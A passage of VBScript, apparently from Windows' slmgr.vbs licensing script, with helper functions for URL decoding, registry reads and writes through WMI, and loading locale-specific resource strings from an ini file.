                code = Mid(code,2)
            End If
        Else
            str = str & code
            code = ""
        End If
    Wend
    URLDecode = str
End Function
Private Function SetRegistryStr(hKey, strKeyPath, strValueName, strValue)
    SetRegistryStr = g_objRegistry.SetStringValue(hKey, strKeyPath, strValueName, strValue)
End Function

Private Function DeleteRegistryValue(hKey, strKeyPath, strValueName)
    DeleteRegistryValue = g_objRegistry.DeleteValue(hKey, strKeyPath, strValueName)
End Function

Private Function ExistsRegistryKey(hKey, strKeyPath)
    Dim bGranted
    Dim lRet

    ' Check for KEY_QUERY_VALUE for this key
    lRet = g_objRegistry.CheckAccess(hKey, strKeyPath, 1, bGranted)

    ' Ignore real access rights, just look for existence of the key
    If lRet<>2 Then
        ExistsRegistryKey = True
    Else
        ExistsRegistryKey = False
    End If
End Function

' Resource manipulation

' Get the resource string with the given name from the locale specific
' dictionary. If not found, use the built-in default.
Private Function GetResource(name)
    LoadResourceData
    If g_resourceDictionary.Exists(LCase(name)) Then
        GetResource = g_resourceDictionary.Item(LCase(name))
    Else
        GetResource = Eval(name)
    End If
End Function

' Loads resource strings from an ini file of the appropriate locale
Private Function LoadResourceData
    If g_resourcesLoaded Then
        Exit Function
    End If

    Dim ini, lang
    Dim fso

    Set fso = WScript.CreateObject("Scripting.FileSystemObject")

    On Error Resume Next
    lang = GetUILanguage()
    If Err.Number <> 0 Then
        'API does not exist prior to Vista so no resources to load
        g_resourcesLoaded = True
        Exit Function
    End If

    ini = fso.GetParentFolderName(WScript.ScriptFullName) & "\slmgr\" _
        & ToHex(lang) & "\" & fso.GetBaseName(WScript.ScriptName) &  ".ini"

    If fso.FileExists(ini) Then
        Dim stream
        Const ForReading = 1, TristateTrue = -1 'Read file in unicode format

        Set stream = fso.OpenTextFile(ini, ForReading, False, TristateTrue)
        ReadResources(stream)
        stream.Close
    End If

    g_resourcesLoaded = True
End Function
